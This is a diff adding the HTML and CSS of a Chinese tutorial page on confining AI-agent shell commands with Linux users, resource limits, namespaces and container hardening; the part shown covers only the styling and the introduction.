@@ -1,0 +1,818 @@
+<!doctype html>
+<html lang="zh-CN">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<style>
+:root{color-scheme:light;padding-top:env(safe-area-inset-top,0px);padding-bottom:env(safe-area-inset-bottom,0px)}
+body{margin:0}
+img{max-width:100%}
+[hidden]{display:none!important}
+</style>
+<title>给 agent 的命令造个笼子：Linux 进程、权限与容器隔离</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600&family=Noto+Sans+SC:wght@400;500;700&family=ZCOOL+KuaiLe&display=swap">
+<style>
+/* 本页：六步页（机制型，补给页）。角色色：pd 蓝 = 用户和权限，g2 棕 = 资源限制（rlimit、cgroup），cg 紫 = namespace，rn 玫红 = 容器的其他加固（只读根、去能力、seccomp），bad = 被拦下的动作。交互：④ 分步动画（四层笼子逐层收紧）。 */
+/* learn 六步页的基础样式（固定一份，不要从别的页面抄）。配色：pd bk cg g2 rn of 六个角色色，warn / bad / good / neutral 含义固定。
+   组件写法见 assets/skeleton.html。本页特有的样式写在文件末尾的标记后面，不改上面的规则。 */
+:root{--paper:#F1F2F4; --card:#FFFFFF; --ink:#18202A; --muted:#5A6473; --line:#D8DDE5; --line-strong:#A8B2C1;
+  --pd:#3150C4; --pd-tint:#E2E7FA;
+  --bk:#0D7A69; --bk-tint:#DCF0EB;
+  --cg:#6A3FC0; --cg-tint:#ECE5FA;
+  --g2:#8A5A2B; --g2-tint:#F3E6D8;
+  --rn:#A8327A; --rn-tint:#F7E1EE;
+  --of:#A26A00; --of-tint:#FBEFCC;
+  --warn:#C2410C; --warn-tint:#FDE6D8;
+  --neutral:#4A5568; --neutral-tint:#E4E8EE;
+  --bad:#C43838; --bad-tint:#F9DEDD;
+  --good:#23824A; --good-tint:#DCF1E3;
+  --on-accent:#FFFFFF;
+  --code-bg:#F7F8FA; --console-bg:#1B2230; --console-fg:#E6EBF2; --console-dim:#8D99AD; --console-hi:#F2C94C;
+  --font-display:"ZCOOL KuaiLe","Noto Sans SC","PingFang SC","Microsoft YaHei",sans-serif;
+  --font-body:"Noto Sans SC","PingFang SC","Hiragino Sans GB","Microsoft YaHei",system-ui,sans-serif;
+  --font-mono:"JetBrains Mono",ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;}
+@media (prefers-color-scheme: dark){
+  :root:not([data-theme="light"]){--paper:#10141A; --card:#182029; --ink:#E6EBF2; --muted:#9AA6B8; --line:#2A3340; --line-strong:#4A5870;
+    --pd:#90A4FF; --pd-tint:#1D2650;
+    --bk:#40C6B0; --bk-tint:#12352F;
+    --cg:#B9A0FF; --cg-tint:#2A2148;
+    --g2:#D9A26B; --g2-tint:#3A2A1A;
+    --rn:#F08BC6; --rn-tint:#3D1A30;
+    --of:#F2C94C; --of-tint:#3A3212;
+    --warn:#FB923C; --warn-tint:#3A2214;
+    --neutral:#B4BFCE; --neutral-tint:#232C38;
+    --bad:#FF7B78; --bad-tint:#3D1B1C;
+    --good:#5FD08A; --good-tint:#163524;
+    --on-accent:#0F141A;
+    --code-bg:#0F151C; --console-bg:#0A0E13; --console-fg:#E6EBF2; --console-dim:#7D889B; --console-hi:#F2C94C;
+    color-scheme:dark;}
+}
+:root[data-theme="dark"]{--paper:#10141A; --card:#182029; --ink:#E6EBF2; --muted:#9AA6B8; --line:#2A3340; --line-strong:#4A5870;
+  --pd:#90A4FF; --pd-tint:#1D2650;
+  --bk:#40C6B0; --bk-tint:#12352F;
+  --cg:#B9A0FF; --cg-tint:#2A2148;
+  --g2:#D9A26B; --g2-tint:#3A2A1A;
+  --rn:#F08BC6; --rn-tint:#3D1A30;
+  --of:#F2C94C; --of-tint:#3A3212;
+  --warn:#FB923C; --warn-tint:#3A2214;
+  --neutral:#B4BFCE; --neutral-tint:#232C38;
+  --bad:#FF7B78; --bad-tint:#3D1B1C;
+  --good:#5FD08A; --good-tint:#163524;
+  --on-accent:#0F141A;
+  --code-bg:#0F151C; --console-bg:#0A0E13; --console-fg:#E6EBF2; --console-dim:#7D889B; --console-hi:#F2C94C;
+  color-scheme:dark;}
+*{box-sizing:border-box}
+body{background:var(--paper); color:var(--ink);
+  font-family:var(--font-body); font-size:16px; line-height:1.65;
+  padding-left:max(16px,env(safe-area-inset-left,0px));
+  padding-right:max(16px,env(safe-area-inset-right,0px));
+  padding-block:0;}
+main{max-width:1040px;margin:0 auto;padding-block:40px 72px;display:flex;flex-direction:column;gap:84px}
+h1,h2,h3,h4{font-family:var(--font-display);font-weight:400;line-height:1.2;text-wrap:balance;margin:0}
+h1{font-size:clamp(34px,6vw,58px)}
+h2{font-size:clamp(28px,4vw,40px)}
+h3{font-size:24px}
+h4{font-size:19px}
+p{margin:0}
+a{color:var(--pd)}
+code{font-family:var(--font-mono);font-size:.86em}
+.lead{color:var(--muted);max-width:44em;margin-top:8px}
+button{font:inherit;color:inherit}
+button:focus-visible,a:focus-visible,summary:focus-visible,[tabindex]:focus-visible,input:focus-visible{outline:3px solid var(--pd);outline-offset:2px}
+section{display:flex;flex-direction:column;gap:24px}
+.sub{display:flex;flex-direction:column;gap:20px;padding-top:12px}
+.sub > h3{display:flex;align-items:baseline;gap:10px;flex-wrap:wrap}
+.sub > h3 small{font-family:var(--font-body);font-size:14px;color:var(--muted)}
+@media (prefers-reduced-motion: reduce){
+  *{transition:none!important;scroll-behavior:auto!important}
+}
+html{scroll-behavior:smooth}
+section[id],.sub[id],.pit[id],figure[id]{scroll-margin-top:64px}
+body::before{content:"";position:fixed;inset:0 0 auto;height:env(safe-area-inset-top,0px);z-index:21;background:var(--paper)}
+.topbar{position:sticky;top:env(safe-area-inset-top,0px);z-index:20;background:var(--paper);border-bottom:1px solid var(--line);margin-left:calc(-1 * max(16px, env(safe-area-inset-left, 0px)));margin-right:calc(-1 * max(16px, env(safe-area-inset-right, 0px)));padding-left:max(16px, env(safe-area-inset-left, 0px));padding-right:max(16px, env(safe-area-inset-right, 0px))}
+.tb-in{max-width:1040px;margin:0 auto;display:flex;align-items:center;gap:8px;padding-block:10px;font-size:14px;color:var(--muted);min-width:0}
+.tb-home{display:inline-flex;align-items:center;gap:6px;padding:4px 12px;border-radius:999px;border:1.5px solid var(--line-strong);background:var(--card);color:var(--ink);text-decoration:none;font-weight:500;flex:none}
+.tb-home:hover{border-color:var(--ink)}
+.tb-here{white-space:nowrap;overflow:hidden;text-overflow:ellipsis;min-width:0}
+[data-role="pd"]{--rc:var(--pd);--rt:var(--pd-tint)}
+[data-role="bk"]{--rc:var(--bk);--rt:var(--bk-tint)}
+[data-role="cg"]{--rc:var(--cg);--rt:var(--cg-tint)}
+[data-role="g2"]{--rc:var(--g2);--rt:var(--g2-tint)}
+[data-role="rn"]{--rc:var(--rn);--rt:var(--rn-tint)}
+[data-role="of"]{--rc:var(--of);--rt:var(--of-tint)}
+[data-role="warn"]{--rc:var(--warn);--rt:var(--warn-tint)}
+[data-role="other"]{--rc:var(--neutral);--rt:var(--neutral-tint)}
+[data-role="bad"]{--rc:var(--bad);--rt:var(--bad-tint)}
+[data-role="done"]{--rc:var(--good);--rt:var(--good-tint)}
+.hero{display:flex;flex-direction:column;gap:12px}
+.kicker{font-family:var(--font-mono);font-size:12.5px;letter-spacing:.08em;color:var(--muted)}
+.hero .lead{font-size:17.5px;color:var(--ink)}
+.hero .lead b{color:var(--of)}
+.route{display:flex;align-items:center;gap:6px;overflow-x:auto;padding:6px 2px 10px;margin-top:6px;scrollbar-width:thin}
+.route a{flex:none;display:inline-flex;align-items:center;gap:6px;padding:6px 13px;border-radius:999px;border:1.5px solid var(--line-strong);background:var(--card);color:var(--ink);text-decoration:none;font-size:14px;white-space:nowrap}
+.route a:hover{border-color:var(--ink)}
+.route a b{font-family:var(--font-display);font-weight:400;font-size:18px;line-height:1;color:var(--of)}
+.route i{flex:none;color:var(--line-strong);font-style:normal;font-size:13px}
+.scene{display:flex;gap:12px;align-items:flex-start;padding:12px 16px;border-radius:14px;background:var(--card);border:1.5px dashed var(--line-strong);font-size:14.5px;max-width:54em}
+.scene b{flex:none;font-family:var(--font-display);font-weight:400;font-size:17px;color:var(--of)}
+.sn{font-family:var(--font-display);color:var(--of);margin-right:.25em}
+figure{margin:0;display:flex;flex-direction:column;gap:10px}
+figcaption{font-size:14px;color:var(--muted);max-width:54em}
+.fig-box{background:var(--card);border:1.5px solid var(--line);border-radius:18px;padding:12px;overflow-x:auto}
+.fig-box svg{display:block;width:100%;height:auto}
+.fig-box.wide svg{min-width:660px}
+.sv text{font-family:var(--font-body)}
+.t-h{font-size:15px;font-weight:700;fill:var(--ink)}
+.t-s{font-size:12.5px;fill:var(--ink)}
+.t-b{font-size:12.5px;font-weight:700;fill:var(--ink)}
+.t-xs{font-size:10.5px;fill:var(--muted)}
+.t-mono{font-family:var(--font-mono)!important;font-size:11.5px;fill:var(--ink)}
+.t-monos{font-family:var(--font-mono)!important;font-size:10.5px;fill:var(--muted)}
+.t-of{font-size:12px;font-weight:700;fill:var(--of)}
+.t-bad{font-size:12px;font-weight:700;fill:var(--bad)}
+.t-bk{font-size:12px;font-weight:700;fill:var(--bk)}
+.t-good{font-size:12px;font-weight:700;fill:var(--good)}
+.b-pd{fill:var(--pd-tint);stroke:var(--pd);stroke-width:2}
+.b-bk{fill:var(--bk-tint);stroke:var(--bk);stroke-width:2}
+.b-cg{fill:var(--cg-tint);stroke:var(--cg);stroke-width:2}
+.b-g2{fill:var(--g2-tint);stroke:var(--g2);stroke-width:2}
+.b-of{fill:var(--of-tint);stroke:var(--of);stroke-width:2}
+.b-warn{fill:var(--warn-tint);stroke:var(--warn);stroke-width:2}
+.b-good{fill:var(--good-tint);stroke:var(--good);stroke-width:2}
+.b-neu{fill:var(--neutral-tint);stroke:var(--neutral);stroke-width:1.5}
+.b-card{fill:var(--card);stroke:var(--line-strong);stroke-width:1.5}
+.b-bad{fill:var(--bad-tint);stroke:var(--bad);stroke-width:2.5}
+.b-dash{fill:none;stroke:var(--line-strong);stroke-width:1.5;stroke-dasharray:5 4}
+.f-ink{fill:var(--ink)}
+.f-of{fill:var(--of)}
+.f-cg{fill:var(--cg)}
+.f-g2{fill:var(--g2)}
+.f-bad{fill:var(--bad)}
+.f-pd{fill:var(--pd)}
+.f-bk{fill:var(--bk)}
+.f-good{fill:var(--good)}
+.f-rn{fill:var(--rn)}
+.e-ink{stroke:var(--ink);stroke-width:2;fill:none}
+.e-mut{stroke:var(--line-strong);stroke-width:2;fill:none}
+.e-of{stroke:var(--of);stroke-width:2.5;fill:none}
+.e-good{stroke:var(--good);stroke-width:2.5;fill:none}
+.e-bad{stroke:var(--bad);stroke-width:2.5;fill:none}
+.pick-line{font-size:16px;padding:12px 16px;border-radius:14px;background:var(--bk);color:var(--on-accent)}
+.pick-line b{font-weight:700}
+.pick-line code{color:inherit}
+.codebox{border:1.5px solid var(--line);border-radius:16px;background:var(--code-bg);overflow:hidden;min-width:0}
+.code-bar{display:flex;flex-wrap:wrap;gap:8px;align-items:center;padding:10px 14px;border-bottom:1.5px solid var(--line);font-size:14px;color:var(--muted)}
+.code-bar code,.code-bar b{color:var(--ink)}
+.code-bar .n{font-family:var(--font-display);font-size:17px;color:var(--of)}
+pre{margin:0;padding:14px 18px;overflow-x:auto;font-family:var(--font-mono);font-size:12.5px;line-height:1.65;color:var(--ink)}
+pre code{font-size:inherit}
+.cm{color:var(--muted)}
+pre.console{background:var(--console-bg);color:var(--console-dim)}
+pre.console b{color:var(--console-hi);font-weight:600}
+pre.console .w{color:var(--console-fg)}
+pre.console .r{color:#FF9B98}
+.tip{font-size:14px;color:var(--muted)}
+.tip code{color:var(--ink);overflow-wrap:anywhere}
+.two{display:grid;grid-template-columns:repeat(2,minmax(0,1fr));gap:16px;align-items:start}
+.tag-real{font-family:var(--font-mono);font-size:11.5px;color:var(--bk);border:1.5px solid var(--bk);border-radius:999px;padding:0 7px;white-space:nowrap}
+.tbl-wrap{overflow-x:auto;border:1.5px solid var(--line);border-radius:16px;background:var(--card)}
+table.t{border-collapse:collapse;width:100%;min-width:720px;font-size:14px;line-height:1.55}
+.t th,.t td{padding:9px 12px;text-align:left;vertical-align:top;border-bottom:1px solid var(--line)}
+.t thead th{font-family:var(--font-display);font-weight:400;font-size:17px;white-space:nowrap}
+.t tbody th{font-weight:600;white-space:nowrap}
+.t tbody tr:last-child > *{border-bottom:0}
+.t td code{font-size:12.5px;overflow-wrap:anywhere}
+.t .bad{color:var(--bad);font-weight:700}
+.t .good{color:var(--good);font-weight:700}
+.design{display:grid;grid-template-columns:repeat(2,minmax(0,1fr));gap:16px}
+.design.three{grid-template-columns:repeat(3,minmax(0,1fr))}
+.pains{margin:0;padding:0;list-style:none;display:flex;flex-direction:column;gap:6px;font-size:14.5px}
+.pains li{position:relative;padding-left:28px}
+.pains li::before{content:"✕";position:absolute;left:0;top:0;width:22px;color:var(--bad);font-weight:700;text-align:center}
+.pains li.ok::before{content:"✓";color:var(--good)}
+.pains li.mid::before{content:"•";color:var(--muted)}
+.pains code{overflow-wrap:anywhere}
+.verdict{font-size:14.5px;padding:10px 14px;border-radius:12px;background:var(--rt);border:2px solid var(--rc)}
+.mech-h .sn{font-size:20px}
+.lab{background:var(--card);border:1.5px solid var(--line);border-radius:18px;padding:16px;display:flex;flex-direction:column;gap:14px}
+.presets{display:grid;grid-template-columns:repeat(4,minmax(0,1fr));gap:8px}
+.presets button{text-align:left;border:1.5px solid var(--line-strong);border-radius:12px;background:var(--card);padding:8px 10px;cursor:pointer;display:flex;flex-direction:column;gap:2px;min-width:0}
+.presets button b{font-family:var(--font-display);font-weight:400;font-size:17px}
+.presets button span{font-size:12.5px;color:var(--muted)}
+.presets button[aria-pressed="true"]{border-color:var(--of);background:var(--of-tint);box-shadow:inset 0 0 0 1px var(--of)}
+.guess{display:flex;flex-direction:column;gap:8px;padding:12px 14px;border-radius:14px;background:var(--neutral-tint)}
+.guess > p{font-size:15px}
+.guess .opts{display:flex;flex-wrap:wrap;gap:8px}
+.guess .opts button{border:1.5px solid var(--line-strong);background:var(--card);border-radius:10px;padding:6px 12px;font-size:14px;cursor:pointer;text-align:left}
+.guess .opts button[aria-pressed="true"]{border-color:var(--ink);box-shadow:inset 0 0 0 1px var(--ink)}
+.guess .opts button.right{border-color:var(--good);background:var(--good-tint)}
+.guess .opts button.wrong{border-color:var(--bad);background:var(--bad-tint)}
+.guess .res{font-size:14.5px;padding:8px 12px;border-radius:10px;border-left:4px solid var(--rc);background:var(--card)}
+.ctl-grid{display:grid;grid-template-columns:repeat(3,minmax(0,1fr));gap:12px 18px}
+.ctl{display:flex;flex-direction:column;gap:5px;min-width:0}
+.ctl.span{grid-column:1 / -1}
+.ctl > .lbl{font-size:13px;color:var(--muted);display:flex;justify-content:space-between;gap:8px}
+.ctl > .lbl output{font-family:var(--font-mono);color:var(--ink);font-weight:600}
+input[type=range]{width:100%;accent-color:var(--of)}
+.tile{border-radius:12px;padding:8px 10px;background:var(--rt);border:1.5px solid var(--rc);display:flex;flex-direction:column;min-width:0}
+.tile small{font-size:12px;color:var(--muted)}
+.tile b{font-family:var(--font-display);font-weight:400;font-size:24px;line-height:1.15;font-variant-numeric:tabular-nums;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.tile span{font-size:12px}
+.lab-res{font-size:14.5px;padding:10px 14px;border-radius:12px;border-left:5px solid var(--rc);background:var(--rt)}
+.lab-res ul{margin:6px 0 0;padding-left:1.2em;display:flex;flex-direction:column;gap:3px}
+.round{display:flex;align-items:center;gap:12px;flex-wrap:wrap}
+.round .rb{font-family:var(--font-mono);font-size:12.5px;padding:3px 10px;border-radius:999px;background:var(--ink);color:var(--paper)}
+.pits{display:grid;grid-template-columns:repeat(2,minmax(0,1fr));gap:14px}
+.pit{display:flex;flex-direction:column;gap:6px;padding:14px 16px;background:var(--card);border:1.5px solid var(--line);border-left:5px solid var(--bad);border-radius:14px;min-width:0}
+.pit > b{font-size:16px;line-height:1.45}
+.pit > b em{font-style:normal;font-family:var(--font-mono);font-size:12px;color:var(--muted);margin-right:6px}
+.root{display:inline-block;font-size:11.5px;font-weight:600;padding:1px 8px;border-radius:999px;border:1.5px solid var(--of);color:var(--ink);background:var(--of-tint);text-decoration:none;margin-left:6px;vertical-align:2px;white-space:nowrap}
+.root.env{border-color:var(--neutral);background:var(--neutral-tint)}
+.pit dl{margin:0;display:grid;grid-template-columns:2.6em minmax(0,1fr);gap:4px 8px;font-size:14px}
+.pit dt{color:var(--muted);font-size:13px;padding-top:1px}
+.pit dd{margin:0;min-width:0}
+.pit dd code{overflow-wrap:anywhere}
+.pit dd.fix{color:var(--good)}
+.pit dd.fix code{color:var(--ink)}
+.pit .seen{font-size:11.5px;font-family:var(--font-mono);color:var(--bk);margin-left:4px}
+.rules-list{display:grid;grid-template-columns:repeat(2,minmax(0,1fr));gap:12px}
+.faq{display:flex;flex-direction:column;gap:8px}
+details{background:var(--card);border:1.5px solid var(--line);border-radius:12px;padding:10px 14px}
+details summary{cursor:pointer;font-weight:600;font-size:15px}
+details[open] summary{margin-bottom:8px}
+details p,details li{font-size:14.5px}
+details p + p{margin-top:6px}
+details ul{margin:0;padding-left:1.2em;display:flex;flex-direction:column;gap:4px}
+details .from{font-size:13px;color:var(--muted)}
+.next{display:grid;grid-template-columns:repeat(2,minmax(0,1fr));gap:8px 18px;margin:0;padding:0;list-style:none}
+.next li{font-size:14.5px;padding-left:1.2em;position:relative}
+.next li::before{content:"↗";position:absolute;left:0;color:var(--of)}
+footer{font-size:13px;color:var(--muted);border-top:1.5px dashed var(--line-strong);padding-top:16px;display:flex;flex-direction:column;gap:6px}
+@media (max-width:980px){
+  .presets{grid-template-columns:repeat(2,minmax(0,1fr))}
+  .ctl-grid{grid-template-columns:repeat(2,minmax(0,1fr))}
+  .design.three{grid-template-columns:1fr}
+}
+@media (max-width:860px){
+  .two,.design,.pits,.rules-list,.next{grid-template-columns:1fr}
+}
+@media (max-width:520px){
+  .presets,.ctl-grid{grid-template-columns:1fr}
+  .tile b{font-size:21px}
+}
+.btn{display:inline-flex;align-items:center;gap:6px;border:1.5px solid var(--line-strong);background:var(--card);border-radius:10px;padding:7px 14px;font-size:14.5px;cursor:pointer}
+.btn:hover{border-color:var(--ink)}
+.btn.primary{background:var(--ink);color:var(--paper);border-color:var(--ink)}
+.b-rn{fill:var(--rn-tint);stroke:var(--rn);stroke-width:2}
+.where{display:flex;flex-wrap:wrap;gap:6px 18px;font-size:14px;color:var(--muted)}
+.know{background:var(--card);border:1.5px dashed var(--line-strong);border-radius:14px;padding:12px 16px;display:flex;flex-direction:column;gap:6px;font-size:14.5px;max-width:54em}
+.know > b{font-family:var(--font-display);font-weight:400;font-size:17px;color:var(--muted)}
+.know ul{margin:0;padding-left:1.2em;display:flex;flex-direction:column;gap:4px}
+table.t td.bad,table.t th.bad{color:var(--bad);font-weight:700}
+table.t td.good{color:var(--good);font-weight:700}
+.t tr.pick td,.t tr.pick th{background:var(--bk-tint)}
+.rootmark{display:inline-block;font-size:11.5px;font-family:var(--font-mono);padding:0 7px;border-radius:999px;border:1.5px solid var(--line-strong);color:var(--muted);text-decoration:none;margin-left:6px;white-space:nowrap}
+.rootmark:hover{border-color:var(--ink);color:var(--ink)}
+.s{color:var(--of)}
+.t-pd{font-size:12px;font-weight:700;fill:var(--pd)}
+.t-rn{font-size:12px;font-weight:700;fill:var(--rn)}
+.e-rn{stroke:var(--rn);stroke-width:2.5;fill:none}
+.e-bk{stroke:var(--bk);stroke-width:2.5;fill:none}
+.e-pd{stroke:var(--pd);stroke-width:2.5;fill:none}
+.e-cg{stroke:var(--cg);stroke-width:2;fill:none}
+.e-dash{stroke:var(--bad);stroke-width:1.5;stroke-dasharray:4 4;fill:none}
+pre.out{background:var(--console-bg);color:var(--console-fg);margin:0;padding:12px 14px;font-size:12.5px;overflow-x:auto}
+.guess .opts button.skip{border-style:dashed;color:var(--muted)}
+#s6 h4{font-size:22px}
+.card{background:var(--card);border:2px solid var(--rc);border-radius:16px;padding:14px 16px;display:flex;flex-direction:column;gap:8px;min-width:0}
+.card h3{font-size:18px;color:var(--rc)}
+.card ul{margin:0;padding-left:1.2em;display:flex;flex-direction:column;gap:4px;font-size:14.5px}
+.card p{font-size:14.5px}
+.cap{font-size:13.5px;color:var(--muted)}
+.steps-out{display:flex;flex-direction:column;gap:6px;margin:0;padding:0;list-style:none}
+.steps-out li{display:grid;grid-template-columns:7.5em minmax(0,1fr);gap:10px;align-items:start;padding:8px 12px;border-radius:10px;border-left:5px solid var(--rc);background:var(--rt);font-size:14px}
+.steps-out li > b{font-weight:700;color:var(--rc)}
+.steps-out li > span{min-width:0}
+.steps-out li code{overflow-wrap:anywhere}
+@media (max-width:560px){
+  .steps-out li{grid-template-columns:minmax(0,1fr)}
+}
+.try{background:var(--card);border:1.5px solid var(--line);border-left:5px solid var(--neutral);border-radius:14px;padding:12px 14px;display:flex;flex-direction:column;gap:6px;min-width:0;font-size:14.5px}
+.try h4{font-size:18px}
+.try code{overflow-wrap:anywhere}
+.stepper{background:var(--card);border:1.5px solid var(--line);border-radius:18px;padding:14px;display:flex;flex-direction:column;gap:12px}
+.stepper:focus-visible{outline:3px solid var(--pd);outline-offset:2px}
+.st-ctl{display:flex;flex-wrap:wrap;gap:8px;align-items:center}
+.st-ctl .pos{font-family:var(--font-mono);font-size:13px;color:var(--muted);margin-left:auto}
+pre.console .hi{color:#7EE2A8;font-weight:600}
+pre.console .c{color:var(--console-dim);font-style:italic}
+pre.console{color:var(--console-fg)}
+.tiles4{display:grid;grid-template-columns:repeat(4,minmax(0,1fr));gap:10px}
+@media (max-width:720px){
+  .tiles4{grid-template-columns:repeat(2,minmax(0,1fr))}
+}
+.e-cg{stroke:var(--cg);stroke-width:2.5;fill:none}
+.tag-real{display:inline-block;font-size:11px;font-family:var(--font-mono);padding:1px 6px;border-radius:6px;background:var(--good-tint);color:var(--good);border:1px solid var(--good);margin-left:6px;vertical-align:middle}
+.t td.bad{color:var(--bad)}
+.t td.fix{color:var(--good)}
+.pains li .note-p{display:block;font-size:13px}
+ol.steps-out{padding-left:1.5em;list-style:decimal}
+ol.steps-out li{display:list-item;line-height:1.75}
+.lab input[type=range]{width:100%;accent-color:var(--of)}
+.x-box{fill:var(--card);stroke:var(--line-strong);stroke-width:1.5}
+.x-zone{fill:none;stroke:var(--line-strong);stroke-width:1.3;stroke-dasharray:6 5}
+.x-zl{font-size:12px;fill:var(--muted)}
+.x-r{fill:var(--rt);stroke:var(--rc);stroke-width:1.8}
+.x-rs{fill:var(--card);stroke:var(--rc);stroke-width:1.8}
+.x-fill{fill:var(--rc)}
+.x-t{font-size:13px;fill:var(--ink)}
+.x-tb{font-size:13.5px;font-weight:700;fill:var(--ink)}
+.x-ts{font-size:11.5px;fill:var(--muted)}
+.x-tc{font-size:12px;font-weight:700;fill:var(--rc)}
+.x-mono{font-family:var(--font-mono);font-size:11px;fill:var(--ink)}
+.x-mono.dim{fill:var(--muted)}
+.x-mono.bad{fill:var(--bad);font-weight:600}
+.x-bad{font-size:12px;font-weight:700;fill:var(--bad)}
+.x-ed{stroke:var(--line-strong);stroke-width:1.6;fill:none}
+.x-ed.dash{stroke-dasharray:5 4}
+.x-ed.bad{stroke:var(--bad)}
+.x-ed.c{stroke:var(--rc);stroke-width:2}
+.x-mk{fill:var(--line-strong)}
+.x-mkb{fill:var(--bad)}
+.fig-box{overflow-x:auto;border:1.5px solid var(--line);border-radius:16px;background:var(--card);padding:10px}
+.fig-box > svg{min-width:760px;width:100%;display:block}
+.swipe{display:none;font-size:13px;color:var(--muted);margin:0 0 4px}
+@media (max-width:800px){
+  .swipe{display:block}
+}
+.ids{font-family:var(--font-mono);font-size:12.5px;overflow-wrap:anywhere}
+.ids .a{color:var(--cg);font-weight:600}
+.ids .b{color:var(--of);font-weight:600}
+.verdict-box{font-size:14.5px;padding:10px 14px;border-radius:12px;border:2px solid var(--rc);background:var(--rt)}
+.knob-row{display:flex;flex-wrap:wrap;gap:12px 20px;align-items:end}
+.knob-row label{display:flex;flex-direction:column;gap:4px;font-size:13.5px;color:var(--muted)}
+.knob-row select{font:inherit;font-size:14px;padding:4px 8px;border-radius:8px;border:1.5px solid var(--line-strong);background:var(--card);color:var(--ink)}
+@media (max-width:640px){
+  .ctl-grid{grid-template-columns:1fr!important}
+}
+.codebox pre .bad{color:var(--bad);font-weight:600}
+.codebox pre .ok{color:var(--good);font-weight:600}
+.st-cap{font-size:15px;padding:10px 14px;border-radius:12px;background:var(--rt);border-left:5px solid var(--rc);min-height:5.2em}
+.st-cap b.h{display:block;font-family:var(--font-display);font-weight:400;font-size:19px;color:var(--rc);margin-bottom:2px}
+.st-cap code{overflow-wrap:anywhere}
+.sv .fade{opacity:.25;transition:opacity .25s}
+.sv .lit{opacity:1;transition:opacity .25s}
+.sv .lit .x-rs,.sv .lit .x-r{stroke-width:3}
+/* ===== 本页特有的样式写在这一行下面 ===== */
+</style>
+<style id="tocx-css">
+/* tocx：顶栏里的跳转导航，由 learn skill 的 add_toc.py 注入（wrap.py 会自动调用）。
+   有六步路线条（main nav.route）的页面：把路线条复制进顶栏，滚动时高亮当前一步；窄屏只留序号。
+   没有路线条的老页面：顶栏右侧加“目录 ▾”，下拉列出各个 h2，滚动时高亮当前一节。
+   只用各页都有的颜色变量：--paper --card --ink --muted --line --line-strong。 */
+.tocx-steps{margin-left:auto;flex:none;display:flex;align-items:center;gap:3px;overflow-x:auto;scrollbar-width:none;max-width:100%}
+.tocx-steps::-webkit-scrollbar{display:none}
+.tocx-steps a{flex:none;display:inline-flex;align-items:center;gap:4px;padding:3px 9px;border-radius:999px;border:1.5px solid transparent;color:var(--muted);text-decoration:none;font-size:13px;line-height:1.4;white-space:nowrap}
+.tocx-steps a b{font-weight:700;color:var(--ink)}
+.tocx-steps a:hover{border-color:var(--line-strong);color:var(--ink)}
+.tocx-steps a.on{background:var(--ink);border-color:var(--ink);color:var(--paper)}
+.tocx-steps a.on b{color:var(--paper)}
+.tocx-dd{margin-left:auto;flex:none;position:relative}
+.tocx-btn{font:inherit;font-size:13.5px;line-height:1.4;padding:4px 12px;border-radius:999px;border:1.5px solid var(--line-strong);background:var(--card);color:var(--ink);cursor:pointer;white-space:nowrap}
+.tocx-btn:hover,.tocx-btn[aria-expanded="true"]{border-color:var(--ink)}
+.tocx-panel{position:absolute;right:0;top:calc(100% + 9px);width:min(360px,calc(100vw - 32px));max-height:min(70vh,560px);overflow:auto;background:var(--card);border:1.5px solid var(--line-strong);border-radius:14px;box-shadow:0 12px 32px rgba(0,0,0,.18);padding:6px;z-index:40}
+.tocx-panel a{display:flex;gap:8px;padding:7px 10px;border-radius:9px;color:var(--ink);text-decoration:none;font-size:14px;line-height:1.45}
+.tocx-panel a i{flex:none;width:1.7em;font-style:normal;font-variant-numeric:tabular-nums;color:var(--muted);font-size:12px;padding-top:2px}
+.tocx-panel a:hover{background:var(--line)}
+.tocx-panel a.on{background:var(--ink);color:var(--paper)}
+.tocx-panel a.on i{color:var(--paper)}
+.tocx-steps a:focus-visible,.tocx-btn:focus-visible,.tocx-panel a:focus-visible{outline:3px solid var(--ink);outline-offset:2px}
+@media (max-width:1180px){.tocx-steps a span{display:none}.tocx-steps a{padding:3px 8px}}
+.tb-in > span{white-space:nowrap}
+@media (max-width:640px){.tb-in > span:not(.tb-here){display:none}.tocx-on .tb-in > span{display:none}.tocx-steps{flex:0 1 auto;min-width:0}.tocx-steps a{padding:3px 6px}}
+</style>
+</head>
+<body>
+<nav class="topbar" aria-label="页面导航"><div class="tb-in"><a class="tb-home" href="../">← 返回目录</a><span aria-hidden="true">/</span><span>云原生与交付</span><span aria-hidden="true">/</span><span class="tb-here">进程、权限与容器隔离</span></div></nav>
+<main>
+<svg width="0" height="0" style="position:absolute" aria-hidden="true" focusable="false">
+  <defs><marker id="xa" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" class="x-mk"/></marker></defs>
+</svg>
+
+<header class="hero">
+  <p class="kicker">Linux · uid / rlimit / cgroup / namespace / docker run · Ubuntu 22.04、内核 6.8、Docker 27 实测</p>
+  <h1>给 agent 的命令造个笼子：Linux 进程、权限与容器隔离</h1>
+  <p class="lead">模型提议的命令，最后是你机器上的一个子进程；默认它和 agent <b>同一个用户</b>，你能读写的它都能读写，你能连的网它都能连。把它关进笼子靠四样 Linux 机制叠起来：<b>用户和权限</b>（它是谁）、<b>资源限制</b>（能用多少）、<b>namespace</b>（看得见什么）、<b>容器的其他加固</b>（只读根、去掉特权能力）。<code>docker run</code> 只是一次把它们全打开的快捷方式。</p>
+  <nav class="route" aria-label="六步学习路线">
+<a href="#s1"><b>①</b>为什么需要</a><i aria-hidden="true">→</i>
+<a href="#s2"><b>②</b>没有它会怎样</a><i aria-hidden="true">→</i>
+<a href="#s3"><b>③</b>相邻方案</a><i aria-hidden="true">→</i>
+<a href="#s4"><b>④</b>原理</a><i aria-hidden="true">→</i>
+<a href="#s5"><b>⑤</b>亲眼看到</a><i aria-hidden="true">→</i>
+<a href="#s6"><b>⑥</b>细节</a><i aria-hidden="true">→</i>
+<a href="#loop"><b>↺</b>回到⑤</a>
+</nav>
+  <p class="where"><span>补给：<a href="../agent/roadmap.html#st04">AI 地图站 04</a> 要用</span><span>全景：<a href="../agent/pano-04-triage-agent.html#s-6">一次排障提问，agent 来回了几轮 · 第 6 站</a></span><span>深度：懂机制</span></p>
